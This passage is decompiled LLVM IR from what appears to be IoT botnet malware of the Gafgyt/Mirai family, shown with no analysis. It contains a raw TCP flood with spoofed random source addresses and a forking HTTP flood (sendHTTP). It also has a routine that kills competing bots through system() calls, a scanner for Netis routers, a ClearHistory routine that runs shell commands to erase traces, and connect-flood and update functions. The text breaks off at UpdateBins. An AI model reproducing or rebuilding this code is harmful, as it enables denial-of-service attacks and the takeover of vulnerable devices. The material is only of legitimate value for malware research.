  %v4_804d879 = inttoptr i32 %v3_804d879 to i16*
  store i16 %v1_804d879, i16* %v4_804d879, align 2
  %v1_804d880 = add i32 %v2_804d596, 36
  %v2_804d880 = inttoptr i32 %v1_804d880 to i16*
  store i16 0, i16* %v2_804d880, align 4
  store i32 %v1_804d5ae, i32* %eax.global-to-local, align 4
  %v1_804d889 = add i32 %v2_804d596, 38
  %v2_804d889 = inttoptr i32 %v1_804d889 to i16*
  store i16 0, i16* %v2_804d889, align 2
  store i1 false, i1* %cf.global-to-local, align 1
  br i1 %v1_804d466, label %dec_label_pc_804d8a2, label %dec_label_pc_804d895

dec_label_pc_804d895:                             ; preds = %dec_label_pc_804d86e
  %v0_804d895 = load i8*, i8** %stack_var_-20, align 4
  %v1_804d895 = ptrtoint i8* %v0_804d895 to i32
  %v2_804d895 = call i32 @rand_cmwc(i32 %v1_804d895)
  br label %dec_label_pc_804d8b6

dec_label_pc_804d8a2:                             ; preds = %dec_label_pc_804d86e
  %v1_804d8a5 = urem i32 %arg2, 65536
  store i32 %v1_804d8a5, i32* %eax.global-to-local, align 4
  %v1_804d8a8 = load i32, i32* @esp, align 4
  %v2_804d8a8 = inttoptr i32 %v1_804d8a8 to i32*
  store i32 %v1_804d8a5, i32* %v2_804d8a8, align 4
  %v3_804d8ab = call i32 @htons(i16 %tmp39)
  br label %dec_label_pc_804d8b6

dec_label_pc_804d8b6:                             ; preds = %dec_label_pc_804d895, %dec_label_pc_804d8a2
  %storemerge12.in = phi i32 [ %v2_804d895, %dec_label_pc_804d895 ], [ %v3_804d8ab, %dec_label_pc_804d8a2 ]
  %storemerge = trunc i32 %storemerge12.in to i16
  %sext = mul i32 %storemerge12.in, 65536
  %v4_804d8b9 = sdiv i32 %sext, 65536
  store i32 %v4_804d8b9, i32* @esi, align 4
  %v3_804d8bc = add i32 %v2_804d596, 22
  %v4_804d8bc = inttoptr i32 %v3_804d8bc to i16*
  store i16 %storemerge, i16* %v4_804d8bc, align 2
  %v1_804d8c3 = load i32, i32* @esp, align 4
  %v2_804d8c3 = add i32 %v1_804d8c3, 4
  %v3_804d8c3 = inttoptr i32 %v2_804d8c3 to i32*
  store i32 %v1_804d5ae, i32* %v3_804d8c3, align 4
  store i32 %v2_804d596, i32* %eax.global-to-local, align 4
  %v1_804d8ca = load i32, i32* @esp, align 4
  %v2_804d8ca = inttoptr i32 %v1_804d8ca to i32*
  store i32 %v2_804d596, i32* %v2_804d8ca, align 4
  %v0_804d8cd = call i32 @tcpcsum()
  %v1_804d8d2 = urem i32 %v0_804d8cd, 65536
  store i32 %v1_804d8d2, i32* %edx.global-to-local, align 4
  %v1_804d8d8 = trunc i32 %v0_804d8cd to i16
  store i16 %v1_804d8d8, i16* %v2_804d880, align 4
  store i32 %v2_804d596, i32* %eax.global-to-local, align 4
  %v1_804d8df = or i32 %v2_804d596, 2
  %v2_804d8df = inttoptr i32 %v1_804d8df to i16*
  %v3_804d8df = load i16, i16* %v2_804d8df, align 2
  %v4_804d8df = zext i16 %v3_804d8df to i32
  store i32 %v4_804d8df, i32* %edx.global-to-local, align 4
  store i32 %v2_804d596, i32* %eax.global-to-local, align 4
  %v1_804d8e8 = load i32, i32* @esp, align 4
  %v2_804d8e8 = add i32 %v1_804d8e8, 4
  %v3_804d8e8 = inttoptr i32 %v2_804d8e8 to i32*
  store i32 %v4_804d8df, i32* %v3_804d8e8, align 4
  %v0_804d8ec = load i32, i32* %eax.global-to-local, align 4
  %v1_804d8ec = load i32, i32* @esp, align 4
  %v2_804d8ec = inttoptr i32 %v1_804d8ec to i32*
  store i32 %v0_804d8ec, i32* %v2_804d8ec, align 4
  %v3_804d8ef = inttoptr i32 %v4_804d8b9 to i16*
  %v4_804d8ef = call i32 @csum(i16* %v3_804d8ef, i32 %v15_804d44b)
  %v1_804d8f4 = urem i32 %v4_804d8ef, 65536
  store i32 %v1_804d8f4, i32* %edx.global-to-local, align 4
  store i32 %v2_804d596, i32* %eax.global-to-local, align 4
  %v1_804d8fa = trunc i32 %v4_804d8ef to i16
  %v3_804d8fa = or i32 %v2_804d596, 10
  %v4_804d8fa = inttoptr i32 %v3_804d8fa to i16*
  store i16 %v1_804d8fa, i16* %v4_804d8fa, align 2
  %v0_804d8fe = load i32, i32* @esp, align 4
  %v1_804d8fe = inttoptr i32 %v0_804d8fe to i32*
  store i32 0, i32* %v1_804d8fe, align 4
  %v2_804d905 = inttoptr i32 %v4_804d8b9 to i32*
  %v3_804d905 = call i32 @__GI_time(i32* %v2_804d905)
  %v5_804d90a = add i32 %v3_804d905, %arg3
  %v10_804d90a = icmp ult i32 %v5_804d90a, %v3_804d905
  store i1 %v10_804d90a, i1* %cf.global-to-local, align 1
  store i32 %v5_804d90a, i32* %eax.global-to-local, align 4
  %v2_804d961 = or i32 %v2_804d596, 12
  %v3_804d961 = inttoptr i32 %v2_804d961 to i32*
  %v3_804d96f = or i32 %v2_804d596, 4
  %v4_804d96f = inttoptr i32 %v3_804d96f to i16*
  br label %dec_label_pc_804d919

dec_label_pc_804d919:                             ; preds = %dec_label_pc_804d9dd, %dec_label_pc_804d9fa, %dec_label_pc_804d8b6
  %stack_var_-68.0 = phi i32 [ 0, %dec_label_pc_804d8b6 ], [ %v4_804d9fa, %dec_label_pc_804d9fa ], [ 0, %dec_label_pc_804d9dd ]
  store i32 %v2_804d596, i32* %edx.global-to-local, align 4
  %v0_804d91f = load i32, i32* @esp, align 4
  %v1_804d91f = add i32 %v0_804d91f, 20
  %v2_804d91f = inttoptr i32 %v1_804d91f to i32*
  store i32 16, i32* %v2_804d91f, align 4
  %v1_804d927 = load i32, i32* @esp, align 4
  %v2_804d927 = add i32 %v1_804d927, 16
  %v3_804d927 = inttoptr i32 %v2_804d927 to i32*
  store i32 %v2_804d48b, i32* %v3_804d927, align 4
  %v0_804d92b = load i32, i32* @esp, align 4
  %v1_804d92b = add i32 %v0_804d92b, 12
  %v2_804d92b = inttoptr i32 %v1_804d92b to i32*
  store i32 0, i32* %v2_804d92b, align 4
  store i32 %v1_804d572, i32* @edi, align 4
  %v1_804d936 = load i32, i32* @esp, align 4
  %v2_804d936 = add i32 %v1_804d936, 8
  %v3_804d936 = inttoptr i32 %v2_804d936 to i32*
  store i32 %v1_804d572, i32* %v3_804d936, align 4
  %v0_804d93a = load i32, i32* %edx.global-to-local, align 4
  %v1_804d93a = load i32, i32* @esp, align 4
  %v2_804d93a = add i32 %v1_804d93a, 4
  %v3_804d93a = inttoptr i32 %v2_804d93a to i32*
  store i32 %v0_804d93a, i32* %v3_804d93a, align 4
  store i32 %v4_804d4d3, i32* %eax.global-to-local, align 4
  %v1_804d941 = load i32, i32* @esp, align 4
  %v2_804d941 = inttoptr i32 %v1_804d941 to i32*
  store i32 %v4_804d4d3, i32* %v2_804d941, align 4
  %v1_804d944 = load i32, i32* %stack_var_-64, align 4
  %v2_804d944 = load i32, i32* %stack_var_-60, align 4
  %v3_804d944 = load i32, i32* %stack_var_-56, align 4
  %v4_804d944 = load i32, i32* %stack_var_-52, align 4
  %v6_804d944 = call i32 @__libc_sendto(i32 %stack_var_-68.0, i32 %v1_804d944, i32 %v2_804d944, i32 %v3_804d944, i32 %v4_804d944, i32 0)
  store i32 %storemerge10, i32* %eax.global-to-local, align 4
  %v1_804d94c = load i32, i32* @esp, align 4
  %v2_804d94c = inttoptr i32 %v1_804d94c to i32*
  store i32 %storemerge10, i32* %v2_804d94c, align 4
  %v1_804d94f = load i32, i32* %stack_var_-64, align 4
  %v2_804d94f = call i32 @GetRandomIP(i32 %stack_var_-68.0, i32 %v1_804d94f)
  store i32 %v2_804d94f, i32* %eax.global-to-local, align 4
  %v1_804d954 = load i32, i32* @esp, align 4
  %v2_804d954 = inttoptr i32 %v1_804d954 to i32*
  store i32 %v2_804d94f, i32* %v2_804d954, align 4
  %v0_804d957 = call i32 @htonl()
  store i32 %v0_804d957, i32* %edx.global-to-local, align 4
  store i32 %v2_804d596, i32* %eax.global-to-local, align 4
  store i32 %v0_804d957, i32* %v3_804d961, align 4
  %v1_804d964 = call i32 @rand_cmwc(i32 %stack_var_-68.0)
  %v1_804d969 = urem i32 %v1_804d964, 65536
  store i32 %v1_804d969, i32* %edx.global-to-local, align 4
  store i32 %v2_804d596, i32* %eax.global-to-local, align 4
  %v1_804d96f = trunc i32 %v1_804d964 to i16
  store i16 %v1_804d96f, i16* %v4_804d96f, align 4
  %v1_804d973 = call i32 @rand_cmwc(i32 %stack_var_-68.0)
  store i32 %v1_804d973, i32* %edx.global-to-local, align 4
  store i32 %v1_804d5ae, i32* %eax.global-to-local, align 4
  store i32 %v1_804d973, i32* %v3_804d609, align 8
  %v1_804d980 = call i32 @rand_cmwc(i32 %stack_var_-68.0)
  %v1_804d985 = urem i32 %v1_804d980, 65536
  store i32 %v1_804d985, i32* %edx.global-to-local, align 4
  %v1_804d98b = trunc i32 %v1_804d980 to i16
  store i16 %v1_804d98b, i16* %v5_804d5b1, align 4
  store i16 0, i16* %v2_804d880, align 4
  %v1_804d99a = load i32, i32* @esp, align 4
  %v2_804d99a = add i32 %v1_804d99a, 4
  %v3_804d99a = inttoptr i32 %v2_804d99a to i32*
  store i32 %v1_804d5ae, i32* %v3_804d99a, align 4
  store i32 %v2_804d596, i32* %eax.global-to-local, align 4
  %v1_804d9a1 = load i32, i32* @esp, align 4
  %v2_804d9a1 = inttoptr i32 %v1_804d9a1 to i32*
  store i32 %v2_804d596, i32* %v2_804d9a1, align 4
  %v0_804d9a4 = call i32 @tcpcsum()
  %v1_804d9a9 = urem i32 %v0_804d9a4, 65536
  store i32 %v1_804d9a9, i32* %edx.global-to-local, align 4
  %v1_804d9af = trunc i32 %v0_804d9a4 to i16
  store i16 %v1_804d9af, i16* %v2_804d880, align 4
  store i32 %v2_804d596, i32* %eax.global-to-local, align 4
  %v3_804d9b6 = load i16, i16* %v2_804d8df, align 2
  %v4_804d9b6 = zext i16 %v3_804d9b6 to i32
  store i32 %v4_804d9b6, i32* %edx.global-to-local, align 4
  store i32 %v2_804d596, i32* %eax.global-to-local, align 4
  %v1_804d9bf = load i32, i32* @esp, align 4
  %v2_804d9bf = add i32 %v1_804d9bf, 4
  %v3_804d9bf = inttoptr i32 %v2_804d9bf to i32*
  store i32 %v4_804d9b6, i32* %v3_804d9bf, align 4
  %v0_804d9c3 = load i32, i32* %eax.global-to-local, align 4
  %v1_804d9c3 = load i32, i32* @esp, align 4
  %v2_804d9c3 = inttoptr i32 %v1_804d9c3 to i32*
  store i32 %v0_804d9c3, i32* %v2_804d9c3, align 4
  %v1_804d9c6 = load i32, i32* %stack_var_-64, align 4
  %v2_804d9c6 = inttoptr i32 %stack_var_-68.0 to i16*
  %v3_804d9c6 = call i32 @csum(i16* %v2_804d9c6, i32 %v1_804d9c6)
  %v1_804d9cb = urem i32 %v3_804d9c6, 65536
  store i32 %v1_804d9cb, i32* %edx.global-to-local, align 4
  %v1_804d9d1 = trunc i32 %v3_804d9c6 to i16
  store i16 %v1_804d9d1, i16* %v4_804d8fa, align 2
  store i32 %arg7, i32* %eax.global-to-local, align 4
  %v10_804d9d8 = icmp ult i32 %stack_var_-68.0, %arg7
  store i1 %v10_804d9d8, i1* %cf.global-to-local, align 1
  %v15_804d9d8 = icmp eq i32 %stack_var_-68.0, %arg7
  %v1_804d9db = icmp eq i1 %v15_804d9d8, false
  br i1 %v1_804d9db, label %dec_label_pc_804d9fa, label %dec_label_pc_804d9dd

dec_label_pc_804d9dd:                             ; preds = %dec_label_pc_804d919
  %v0_804d9dd = load i32, i32* @esp, align 4
  %v1_804d9dd = inttoptr i32 %v0_804d9dd to i32*
  store i32 0, i32* %v1_804d9dd, align 4
  %v1_804d9e4 = inttoptr i32 %stack_var_-68.0 to i32*
  %v2_804d9e4 = call i32 @__GI_time(i32* %v1_804d9e4)
  store i32 %v2_804d9e4, i32* %eax.global-to-local, align 4
  %v10_804d9e9 = icmp ult i32 %v2_804d9e4, %v5_804d90a
  store i1 %v10_804d9e9, i1* %cf.global-to-local, align 1
  %v8_804d9ec = icmp sgt i32 %v2_804d9e4, %v5_804d90a
  br i1 %v8_804d9ec, label %dec_label_pc_804da02, label %dec_label_pc_804d919

dec_label_pc_804d9fa:                             ; preds = %dec_label_pc_804d919
  %v4_804d9fa = add i32 %stack_var_-68.0, 1
  br label %dec_label_pc_804d919

dec_label_pc_804da02:                             ; preds = %dec_label_pc_804d9dd, %dec_label_pc_804d48b, %dec_label_pc_804d530, %dec_label_pc_804d4e1
  %v0_804da0c = phi i32 [ %v4_804d49b, %dec_label_pc_804d48b ], [ %v3_804d540, %dec_label_pc_804d530 ], [ %v3_804d4f1, %dec_label_pc_804d4e1 ], [ %v2_804d9e4, %dec_label_pc_804d9dd ]
  store i32 %v0_804d44a, i32* @ebx, align 4
  store i32 %v0_804d449, i32* @esi, align 4
  ret i32 %v0_804da0c

; uselistorder directives
  uselistorder i32 %v3_804d9c6, { 1, 0 }
  uselistorder i32 %v0_804d9a4, { 1, 0 }
  uselistorder i32 %v1_804d980, { 1, 0 }
  uselistorder i32 %v1_804d964, { 1, 0 }
  uselistorder i32 %stack_var_-68.0, { 2, 1, 0, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32 %v5_804d90a, { 1, 0, 2, 3 }
  uselistorder i32 %v3_804d905, { 1, 0 }
  uselistorder i32 %v4_804d8ef, { 1, 0 }
  uselistorder i32 %v0_804d8cd, { 1, 0 }
  uselistorder i32 %v4_804d8b9, { 2, 1, 0 }
  uselistorder i32 %v1_804d8a5, { 1, 0 }
  uselistorder i32 %v2_804d86e, { 1, 0 }
  uselistorder i32 %stack_var_-160.0, { 1, 0 }
  uselistorder i8* %stack_var_-156.0, { 1, 0 }
  uselistorder i1 %v0_804d80e, { 1, 0 }
  uselistorder i32 %v7_804d80c, { 1, 0 }
  uselistorder i1 %v0_804d7ba, { 1, 0 }
  uselistorder i32 %v7_804d7b8, { 1, 0 }
  uselistorder i1 %v0_804d763, { 1, 0 }
  uselistorder i32 %v7_804d761, { 1, 0 }
  uselistorder i1 %v0_804d718, { 1, 0 }
  uselistorder i32 %v7_804d716, { 1, 0 }
  uselistorder i1 %v0_804d6d3, { 1, 0 }
  uselistorder i32 %v7_804d6d1, { 1, 0 }
  uselistorder i32 %v4_804d6b3, { 1, 0, 3, 2, 5, 4, 7, 6, 9, 8, 10, 11 }
  uselistorder i8* %stack_var_-156.125, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-160.126, { 3, 2, 1, 0 }
  uselistorder i8* %v3_804d836, { 5, 4, 3, 2, 0, 1 }
  uselistorder i8* %v2_804d824, { 4, 9, 3, 8, 2, 7, 1, 6, 0, 5 }
  uselistorder i8* %v2_804d65a, { 4, 5, 3, 6, 2, 7, 1, 8, 0, 9 }
  uselistorder i1 %v0_804d644, { 1, 0 }
  uselistorder i32 %v7_804d642, { 1, 0 }
  uselistorder i32 %v2_804d5f1, { 1, 0 }
  uselistorder i32 %v1_804d5ae, { 5, 6, 7, 8, 0, 1, 2, 3, 4, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19 }
  uselistorder i32 %v2_804d596, { 15, 14, 12, 13, 11, 10, 9, 27, 26, 25, 8, 7, 24, 6, 4, 5, 23, 22, 21, 20, 28, 19, 18, 17, 16, 2, 3, 1, 0 }
  uselistorder i32 %v1_804d572, { 1, 0, 2 }
  uselistorder i32 %storemerge10, { 1, 0, 3, 2 }
  uselistorder i32 %v2_804d568, { 1, 0 }
  uselistorder i32 %v4_804d4d3, { 1, 0, 4, 3, 2, 5, 6 }
  uselistorder i32 %v1_804d479, { 1, 0 }
  uselistorder i32 %v15_804d44b, { 1, 0 }
  uselistorder i32* %stack_var_-60, { 2, 0, 1, 4, 3 }
  uselistorder i32* %stack_var_-56, { 1, 2, 0 }
  uselistorder i32* %stack_var_-64, { 1, 0, 2, 4, 3 }
  uselistorder i8** %stack_var_-20, { 3, 1, 2, 0 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34 }
  uselistorder i32* %eax.global-to-local, { 31, 0, 1, 2, 3, 4, 5, 6, 7, 9, 8, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 48, 32, 33, 34, 35, 36, 37, 38, 39, 40, 42, 41, 44, 43, 45, 46, 47, 50, 49, 52, 51, 53, 54, 56, 55, 58, 57, 59, 60 }
  uselistorder i1* %cf.global-to-local, { 0, 1, 2, 3, 18, 4, 5, 7, 6, 8, 10, 9, 11, 13, 12, 14, 16, 15, 17, 38, 39, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37 }
  uselistorder i32 ()* @tcpcsum, { 1, 0 }
  uselistorder i32 ()* @makeIPPacket, { 1, 0 }
  uselistorder i32 ()* @htonl, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32)* @GetRandomIP, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__GI_setsockopt, { 2, 1, 0 }
  uselistorder i32 (i32)* @rand_cmwc, { 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg7, { 0, 2, 1, 3 }
  uselistorder i32 %arg6, { 2, 3, 1, 0 }
  uselistorder i8* %arg5, { 1, 0 }
  uselistorder i32 %arg4, { 2, 1, 0 }
  uselistorder i32 %arg2, { 0, 3, 1, 2 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804da02, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_804d919, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804d8b6, { 1, 0 }
  uselistorder label %dec_label_pc_804d84d, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_804d6b3, { 1, 0 }
  uselistorder label %dec_label_pc_804d56f, { 1, 0 }
  uselistorder label %bb90, { 1, 0 }
  uselistorder label %dec_label_pc_804d48b, { 1, 0 }
}

define i32 @botkiller() local_unnamed_addr {
entry:
  %stack_var_-88 = alloca i32, align 4
  %v2_804da1f = ptrtoint i32* %stack_var_-88 to i32
  %v2_804da49 = bitcast i32* %stack_var_-88 to i8*
  br label %dec_label_pc_804da13

dec_label_pc_804da13:                             ; preds = %dec_label_pc_804dab7, %entry
  br label %dec_label_pc_804da1f

dec_label_pc_804da1f:                             ; preds = %dec_label_pc_804da13, %dec_label_pc_804da1f
  %storemerge8 = phi i32 [ 0, %dec_label_pc_804da13 ], [ %v4_804daaa, %dec_label_pc_804da1f ]
  store i32 1818848112, i32* %stack_var_-88, align 4
  %v1_804da38 = mul nuw nsw i32 %storemerge8, 4
  %v2_804da38 = add i32 %v1_804da38, ptrtoint ([87 x i8*]* @global_var_8062040.313 to i32)
  %v3_804da38 = inttoptr i32 %v2_804da38 to i32*
  %v4_804da38 = load i32, i32* %v3_804da38, align 4
  %v3_804da49 = call i32 @strcat(i8* %v2_804da49, i32 %v4_804da38)
  %v1_804da54 = call i32 @__libc_system(i32 %v2_804da1f)
  store i32 1818848112, i32* %stack_var_-88, align 4
  %v4_804da76 = load i32, i32* %v3_804da38, align 4
  %v3_804da87 = call i32 @strcat(i8* %v2_804da49, i32 %v4_804da76)
  %v3_804da9a = call i32 @strcat(i8* %v2_804da49, i32 ptrtoint (i32* @global_var_80581d9.314 to i32))
  %v1_804daa5 = call i32 @__libc_system(i32 %v2_804da1f)
  %v4_804daaa = add nuw nsw i32 %storemerge8, 1
  %exitcond = icmp eq i32 %v4_804daaa, 9
  br i1 %exitcond, label %dec_label_pc_804dab7, label %dec_label_pc_804da1f

dec_label_pc_804dab7:                             ; preds = %dec_label_pc_804da1f
  %v1_804dabe = call i32 @sleep(i32 5)
  br label %dec_label_pc_804da13

; uselistorder directives
  uselistorder i32 %storemerge8, { 1, 0 }
  uselistorder i32* %stack_var_-88, { 1, 2, 0, 3 }
  uselistorder [3 x i8]* @global_var_80571fb.15, { 1, 0 }
  uselistorder label %dec_label_pc_804da1f, { 1, 0 }
}

define i32 @NetisScanner() local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_804db16 = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_804dacf

dec_label_pc_804dacf:                             ; preds = %dec_label_pc_804dacf, %entry
  %v4_804dae6 = call i32 @socket(i32 2, i32 2, i32 17)
  store i32 2, i32* %stack_var_-40, align 4
  %v2_804dafb = call i32 @htons(i16 -12123)
  %v1_804db00 = urem i32 %v2_804dafb, 65536
  store i32 %v1_804db00, i32* @eax, align 4
  %sext = mul i32 %v2_804dafb, 65536
  %v1_804db07 = sdiv i32 %sext, 65536
  %v2_804db07 = call i32 @NetisRanges(i32 %v1_804db07)
  %v3_804db4b = call i32 @_strlen(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_80581db.315, i32 0, i32 0))
  %v7_804db77 = call i32 @__libc_sendto(i32 %v4_804dae6, i32 ptrtoint ([16 x i8]* @global_var_80581db.315 to i32), i32 %v3_804db4b, i32 0, i32 %v2_804db16, i32 16)
  store i32 ptrtoint ([3 x i8]* @global_var_80581ec.316 to i32), i32* @edi, align 4
  %v3_804db90 = call i32 @_strlen(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_80581ec.316, i32 0, i32 0))
  %v7_804dbbc = call i32 @__libc_sendto(i32 %v4_804dae6, i32 ptrtoint ([3 x i8]* @global_var_80581ec.316 to i32), i32 %v3_804db90, i32 0, i32 %v2_804db16, i32 16)
  %v1_804dbc7 = call i32 @__libc_close(i32 %v4_804dae6)
  br label %dec_label_pc_804dacf

; uselistorder directives
  uselistorder [3 x i8]* @global_var_80581ec.316, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__libc_sendto, { 4, 3, 2, 1, 0 }
  uselistorder [16 x i8]* @global_var_80581db.315, { 1, 0 }
}

define i32 @ClearHistory() local_unnamed_addr {
entry:
  %v0_804dbd1 = load i32, i32* @ebp, align 4
  %v2_804dbde = call i32 @__libc_system(i32 ptrtoint ([22 x i8]* @global_var_8058380.317 to i32))
  %v2_804dbea = call i32 @__libc_system(i32 ptrtoint ([30 x i8]* @global_var_8058396.318 to i32))
  %v2_804dbf6 = call i32 @__libc_system(i32 ptrtoint ([21 x i8]* @global_var_80583b4.319 to i32))
  store i32 %v0_804dbd1, i32* @ebp, align 4
  ret i32 %v2_804dbf6
}

define i32 @sendHTTP(i32 %arg1, i32 %arg2, i16 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-3148 = alloca i32, align 4
  %stack_var_-2624 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804dc01 = load i32, i32* @esi, align 4
  %v0_804dc02 = load i32, i32* @ebx, align 4
  store i32 %v0_804dc02, i32* %stack_var_-16, align 4
  %v4_804dc2e = bitcast i32* %stack_var_-2624 to i16*
  %v5_804dc2e = call i32 @memcpy(i16* %v4_804dc2e, i32 ptrtoint ([649 x i8*]* @global_var_805eda0.622 to i32), i32 2596)
  %v2_804dc58 = call i32 @__GI_time(i32* null)
  %v5_804dc5d = add i32 %v2_804dc58, %arg5
  store i32 %v5_804dc5d, i32* @eax, align 4
  %v1_804dc63 = call i32 @random()
  %v2_804dc86 = srem i32 %v1_804dc63, 674
  %v7_804dc8e = sub i32 %v1_804dc63, %v2_804dc86
  store i32 %v7_804dc8e, i32* @eax, align 4
  %v0_804dca8 = load i32, i32* @ebp, align 4
  %v2_804dca8 = mul nsw i32 %v2_804dc86, 4
  %v3_804dca8 = add i32 %v2_804dca8, -2620
  %v4_804dca8 = add i32 %v3_804dca8, %v0_804dca8
  %v5_804dca8 = inttoptr i32 %v4_804dca8 to i32*
  %v6_804dca8 = load i32, i32* %v5_804dca8, align 4
  store i32 %v6_804dca8, i32* @ebx, align 4
  %v1_804dcaf = call i32 @random()
  %v2_804dcd7 = sdiv i32 %v1_804dcaf, 6
  store i32 %v2_804dcd7, i32* @esi, align 4
  %tmp = mul i32 %v2_804dcd7, -30
  %v2_804dcf1 = add i32 %v1_804dcaf, %tmp
  store i32 %v2_804dcf1, i32* @edi, align 4
  %v2_804dd24 = ptrtoint i32* %stack_var_-3148 to i32
  %v5_804dd2d = call i32 @sprintf(i32 %v2_804dd24, i32 ptrtoint ([62 x i8]* @global_var_805f7dc.626 to i32), i32 %arg2, i32 %arg4)
  %v5_804ddd742 = icmp sgt i32 %arg6, 0
  br i1 %v5_804ddd742, label %dec_label_pc_804dd3e, label %dec_label_pc_804dddd

dec_label_pc_804dd3e:                             ; preds = %entry, %dec_label_pc_804ddce
  %storemerge43 = phi i32 [ %v4_804ddce, %dec_label_pc_804ddce ], [ 0, %entry ]
  %v1_804dd3e = call i32 @__libc_fork(i32 %storemerge43)
  %v1_804dd43 = icmp eq i32 %v1_804dd3e, 0
  br i1 %v1_804dd43, label %dec_label_pc_804ddce, label %dec_label_pc_804ddb1.preheader

dec_label_pc_804ddb1.preheader:                   ; preds = %dec_label_pc_804dd3e
  %v4_804dd80 = bitcast i32* %stack_var_-3148 to i8*
  br label %dec_label_pc_804ddb1

dec_label_pc_804dd4d:                             ; preds = %dec_label_pc_804ddb1
  store i32 %arg1, i32* @edx, align 4
  %v4_804dd5e = call i32 @socket_connect(i32 %arg1, i16 %arg3)
  %v4_804dd66 = icmp eq i32 %v4_804dd5e, 0
  br i1 %v4_804dd66, label %dec_label_pc_804ddb1, label %dec_label_pc_804dd6c

dec_label_pc_804dd6c:                             ; preds = %dec_label_pc_804dd4d
  store i1 false, i1* @df, align 1
  store i32 %v2_804dd24, i32* @edi, align 4
  %v3_804dd86 = call i32 @_strlen(i8* %v4_804dd80)
  %v5_804dda1 = call i32 @__libc_write(i32 %v4_804dd5e, i32* nonnull %stack_var_-3148, i32 %v3_804dd86)
  %v1_804ddac = call i32 @__libc_close(i32 %v4_804dd5e)
  br label %dec_label_pc_804ddb1

dec_label_pc_804ddb1:                             ; preds = %dec_label_pc_804dd4d, %dec_label_pc_804dd6c, %dec_label_pc_804ddb1.preheader
  %v2_804ddb8 = call i32 @__GI_time(i32* null)
  %v5_804ddc0 = icmp slt i32 %v2_804ddb8, %v5_804dc5d
  br i1 %v5_804ddc0, label %dec_label_pc_804dd4d, label %dec_label_pc_804ddc2

dec_label_pc_804ddc2:                             ; preds = %dec_label_pc_804ddb1
  %v1_804ddc9 = call i32 @__GI__exit(i32 1)
  unreachable

dec_label_pc_804ddce:                             ; preds = %dec_label_pc_804dd3e
  %v4_804ddce = add nuw nsw i32 %storemerge43, 1
  %v5_804ddd7 = icmp slt i32 %v4_804ddce, %arg6
  br i1 %v5_804ddd7, label %dec_label_pc_804dd3e, label %dec_label_pc_804dddd

dec_label_pc_804dddd:                             ; preds = %dec_label_pc_804ddce, %entry
  %storemerge.lcssa = phi i32 [ 0, %entry ], [ %v4_804ddce, %dec_label_pc_804ddce ]
  %v2_804dde3 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804dde3, i32* @ebx, align 4
  store i32 %v0_804dc01, i32* @esi, align 4
  ret i32 %storemerge.lcssa

; uselistorder directives
  uselistorder i32 %v4_804ddce, { 0, 2, 1 }
  uselistorder i32 %v4_804dd5e, { 1, 0, 2 }
  uselistorder i32 %storemerge43, { 1, 0 }
  uselistorder i32 %arg6, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804ddb1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804dd3e, { 1, 0 }
}

define i32 @sendCNC(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804dde8 = load i32, i32* @ebp, align 4
  store i32 %v0_804dde8, i32* %stack_var_-4, align 4
  %v2_804ddf5 = call i32 @__GI_time(i32* null)
  %v5_804ddfa = add i32 %v2_804ddf5, %arg3
  %v1_804de06 = call i32 @inet_addr(i32 %arg1)
  store i32 2, i32* %stack_var_-28, align 4
  %v1_804de1d = trunc i32 %arg2 to i16
  %v2_804de1d = call i32 @htons(i16 %v1_804de1d)
  %v4_804de55 = ptrtoint i32* %stack_var_-28 to i32
  br label %dec_label_pc_804de7b

dec_label_pc_804de2b:                             ; preds = %dec_label_pc_804de7b
  %v3_804de42 = call i32 @socket(i32 2, i32 1, i32 0)
  %v3_804de5f = call i32 @__libc_connect(i32 %v3_804de42, i32 %v4_804de55, i32 16)
  %v1_804de6b = call i32 @sleep(i32 1)
  %v1_804de76 = call i32 @__libc_close(i32 %v3_804de42)
  br label %dec_label_pc_804de7b

dec_label_pc_804de7b:                             ; preds = %entry, %dec_label_pc_804de2b
  %v2_804de82 = call i32 @__GI_time(i32* null)
  %v5_804de8a = icmp slt i32 %v2_804de82, %v5_804ddfa
  br i1 %v5_804de8a, label %dec_label_pc_804de2b, label %dec_label_pc_804de8c

dec_label_pc_804de8c:                             ; preds = %dec_label_pc_804de7b
  %v2_804de8c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804de8c, i32* @ebp, align 4
  ret i32 %v2_804de82

; uselistorder directives
  uselistorder i32* %stack_var_-28, { 1, 0 }
  uselistorder label %dec_label_pc_804de7b, { 1, 0 }
}

define i32 @UpdateBins(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_804de8e = load i32, i32* @ebp, align 4
